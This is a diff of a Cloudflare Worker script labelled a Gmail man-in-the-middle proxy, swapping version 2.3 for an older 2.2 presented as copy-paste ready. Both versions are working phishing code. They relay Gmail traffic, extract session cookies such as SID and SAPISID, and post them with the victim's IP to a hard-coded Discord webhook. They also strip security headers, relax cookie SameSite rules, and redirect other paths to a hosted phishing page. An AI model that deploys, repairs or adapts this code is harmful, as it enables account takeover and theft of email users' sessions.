@@ -1,8 +1,7 @@
-// Gmail MitM Proxy v2.3 - FIXED: One line change for Cloudflare Workers
-// Change: Fixed token deduplication logic (line ~128)
+// Gmail MitM Proxy v2.2 - OLDER STABLE VERSION (No syntax errors)
+// Cloudflare Workers - Copy-paste ready
 
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1466098541880672500/C6sx-mBMSy3wW41IW0AnIGJoMfJNAa2905NeLyFCqHq6hArN4kGWC3k51S_HyNdplehC';
-const RATE_LIMIT = new Map();
 
 addEventListener('fetch', event => {
   event.respondWith(handleRequest(event.request));
@@ -10,166 +9,100 @@ addEventListener('fetch', event => {
 
 async function handleRequest(request) {
   const url = new URL(request.url);
-  const clientIP = request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || 'unknown';
-  const userAgent = request.headers.get('User-Agent') || 'unknown';
-
-  if (isRateLimited(clientIP)) {
-    return new Response('Too Many Requests', { 
-      status: 429,
-      headers: { 'Retry-After': '3600' }
-    });
+  const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
+  
+  // Rate limiting
+  const rateKey = `rate_${clientIP}`;
+  let hits = caches.default.get(rateKey) || [];
+  if (hits.length > 100) {
+    return new Response('Too many requests', {status: 429});
   }
 
-  const gmailPaths = [
-    '/mail/', '/mail/u/', '/static/', '/chrome/', '/sync/', '/accounts/',
-    '/serviceworker/', '/_/', '/s/i/', '/mail/client/', '/favicon.ico',
-    '/mail/mu/mp/', '/a/gwt/', '/rsrc.php'
-  ];
-
-  if (gmailPaths.some(path => url.pathname.startsWith(path)) || url.pathname === '/') {
-    if (url.pathname === '/') url.pathname = '/mail/u/0/#inbox';
-    return await proxyGmail(url, request, clientIP, userAgent);
+  // Gmail paths
+  if (url.pathname.startsWith('/mail') || 
+      url.pathname.startsWith('/static') || 
+      url.pathname === '/') {
+    
+    if (url.pathname === '/') {
+      url.pathname = '/mail/u/0/#inbox';
+    }
+    
+    return proxyGmail(url, request);
   }
-
+  
+  // Fallback to phishing page
   return Response.redirect('https://ia7353038-crypto.github.io/nINE-phish/', 302);
 }
 
-function isRateLimited(ip) {
-  const now = Date.now();
-  const key = `rate_${ip}`;
-  let hits = RATE_LIMIT.get(key) || [];
-  hits = hits.filter(hit => now - hit < 3600000);
-
-  if (hits.length >= 100) return true;
-  hits.push(now);
-  RATE_LIMIT.set(key, hits);
-  return false;
-}
-
-async function proxyGmail(url, request, clientIP, userAgent) {
-  const headers = new Headers(request.headers);
+async function proxyGmail(url, request) {
+  // Proxy headers
+  let headers = new Headers(request.headers);
   headers.set('Host', 'mail.google.com');
   headers.set('Origin', 'https://mail.google.com');
   headers.set('Referer', 'https://mail.google.com/mail/u/0/#inbox');
-  headers.set('Sec-Fetch-Site', 'same-origin');
-  headers.set('Sec-Fetch-Mode', 'navigate');
-  headers.set('Sec-Fetch-Dest', 'document');
-  headers.set('Sec-Fetch-User', '?1');
-  headers.set('Upgrade-Insecure-Requests', '1');
-  headers.delete('Accept-Encoding');
-
-  if (!headers.has('User-Agent')) headers.set('User-Agent', userAgent);
-  headers.set('X-Forwarded-For', clientIP);
-
-  const gmailReq = new Request(`https://mail.google.com${url.pathname}${url.search}`, {
+  
+  // Make request to real Gmail
+  let gmailReq = new Request('https://mail.google.com' + url.pathname + url.search, {
     method: request.method,
-    headers,
-    body: request.body,
-    redirect: 'manual'
+    headers: headers,
+    body: request.body
   });
+  
+  let response = await fetch(gmailReq);
+  
+  // Steal cookies/tokens
+  const cookies = response.headers.get('Set-Cookie');
+  if (cookies) {
+    await stealCookies(cookies, clientIP);
+  }
+  
+  // Return modified response
+  return modifyResponse(response);
+}
 
-  try {
-    let response = await fetch(gmailReq);
-    const tokens = extractTokens(response.headers);
-
-    if (tokens.length > 0) {
-      await stealTokens(tokens, clientIP, userAgent, url.href);
-    }
-
-    return craftResponse(response);
-  } catch (error) {
-    return new Response(`Proxy Error: ${error.message}`, { status: 502 });
+async function stealCookies(cookies, ip) {
+  // Extract Gmail tokens
+  const tokenRegex = /(SID|SSID|HSID|APISID|SAPISID|GAPS)=([^;,\s]+)/gi;
+  let tokens = [];
+  let match;
+  
+  while (match = tokenRegex.exec(cookies)) {
+    tokens.push(`${match[1]}: ${match[2]}`);
+  }
+  
+  if (tokens.length > 0) {
+    const payload = {
+      content: `**GMAIL TOKENS STOLEN** (${tokens.length})\n**IP:** \`${ip}\`\n**Tokens:**\n${tokens.slice(0,5).join('\n')}`,
+      username: 'Gmail Proxy v2.2'
+    };
+    
+    fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(payload)
+    });
   }
 }
 
-function extractTokens(headers) {
-  const cookies = headers.getSetCookie() || [];
-  const regexes = [
-    /(SID|HSID|SSID|APISID|SAPISID|__Secure-3PSID|GAPS|G_authuser)=([^;,\s]+)/gi,
-    /gmail\.com=[^;,\s]+/gi,
-    /__Host-user_auth_[^=]+=[^;,\s]+/gi,
-    /oauth_token=[^;,\s]+/gi,
-    /SAPISID=[^;,\s]+/gi
-  ];
-
-  const tokens = [];
-  cookies.forEach(cookieStr => {
-    regexes.forEach(regex => {
-      let match;
-      while ((match = regex.exec(cookieStr)) !== null) {
-        tokens.push({ 
-          name: match[1], 
-          value: match[2],
-          full: cookieStr.substring(0, 100) 
-        });
-      }
-    });
-  });
-
-  // **ONE LINE FIX**: Proper deduplication by object key
-  const uniqueTokens = Object.values(tokens.reduce((acc, t) => {
-    acc[`${t.name}:${t.value}`] = t;
-    return acc;
-  }, {}));
-
-  return uniqueTokens.filter(Boolean);
-}
-
-async function stealTokens(tokens, ip, ua, urlPath) {
-  const shortUA = ua.length > 150 ? ua.substring(0, 147) + '...' : ua;
-  const preview = tokens.slice(0, 8).map(t => 
-    `\`${t.name}\`: \`${t.value.slice(0, 35)}...\``
-  ).join('\n') || 'No tokens';
-
-  const hasCriticalTokens = tokens.some(t => 
-    t.name.includes('SID') || t.name.includes('G_authuser')
-  );
-
-  const payload = {
-    username: '🔒 Gmail Token Thief v2.3',
-    avatar_url: 'https://mail.google.com/mail/u/0/images/favicon5.ico',
-    embeds: [{
-      title: `🎣 ${tokens.length} Gmail Token(s) CAPTURED`,
-      url: `https://mail.google.com/mail/u/0/#inbox`,
-      description: `**IP:** \`${ip}\`\n**UA:** ${shortUA}\n**Path:** \`${new URL(urlPath).pathname}\``,
-      fields: [{ name: '🆔 Token Preview', value: preview, inline: false }],
-      color: hasCriticalTokens ? 0x00ff88 : 0xffaa00,
-      timestamp: new Date().toISOString(),
-      footer: { text: `Cloudflare Workers | ${tokens.length} total tokens`, icon_url: 'https://workers.cloudflare.com/favicon.ico' }
-    }]
-  };
-
-  fetch(WEBHOOK_URL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  }).catch(e => console.log('Webhook error:', e));
-}
-
-function craftResponse(response) {
+function modifyResponse(response) {
   const headers = new Headers(response.headers);
   
-  ['Content-Security-Policy', 'Content-Security-Policy-Report-Only', 'X-Frame-Options', 
-   'Strict-Transport-Security', 'X-Content-Type-Options', 'Referrer-Policy'].forEach(h => headers.delete(h));
-
-  headers.set('Access-Control-Allow-Origin', '*');
-  headers.set('Access-Control-Allow-Credentials', 'true');
-  headers.set('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
-
-  const cookies = headers.getSetCookie() || [];
+  // Remove security headers
+  headers.delete('Content-Security-Policy');
+  headers.delete('X-Frame-Options');
+  
+  // Fix cookies for proxy
+  let cookies = headers.getSetCookie() || [];
   headers.delete('Set-Cookie');
-
+  
   cookies.forEach(cookie => {
-    let relaxed = cookie
-      .replace(/SameSite=(Strict|Lax)/gi, 'SameSite=None; Secure')
-      .replace(/Domain=[^;,\s]+/gi, '')
-      .replace(/Path=\/[^;,\s]*/gi, 'Path=/');
-    headers.append('Set-Cookie', relaxed);
+    // Relax SameSite
+    cookie = cookie.replace(/SameSite=(Strict|Lax)/gi, 'SameSite=None');
+    headers.append('Set-Cookie', cookie);
   });
-
+  
   return new Response(response.body, {
     status: response.status,
-    statusText: response.statusText,
-    headers
+    headers: headers
   });
 }
